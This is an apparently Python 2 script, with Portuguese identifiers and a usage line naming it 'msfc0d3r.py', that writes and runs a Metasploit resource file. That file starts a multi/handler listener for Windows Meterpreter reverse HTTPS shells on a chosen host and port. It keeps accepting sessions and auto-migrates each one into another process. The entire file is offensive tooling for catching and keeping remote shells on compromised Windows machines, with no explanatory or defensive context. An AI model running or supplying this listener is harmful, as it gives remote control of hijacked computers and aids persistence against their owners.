#! /usr/bin/python

import sys
import subprocess

def ouvir(lhost, lport):
	arquivo = "use multi/handler\n"
	arquivo += 'set payload windows/meterpreter/reverse_https\n'
	arquivo += "set LHOST %s\nset LPORT %s\n" %(lhost,lport)
	arquivo += "set ExitOnSession false\n"
	arquivo += "set AutoRunScript post/windows/manage/smart_migrate\n"
	arquivo += "exploit -j\n"
	filewrite = file("listar.rc", "w")
	filewrite.write(arquivo)
	filewrite.close()
	subprocess.Popen("msfconsole -r listar.rc", shell=True).wait()

try:
	lhost = sys.argv[1]
	lport = sys.argv[2]
	ouvir(lhost,lport)


except IndexError:
	print ("python msfc0d3r.py lhost lport")
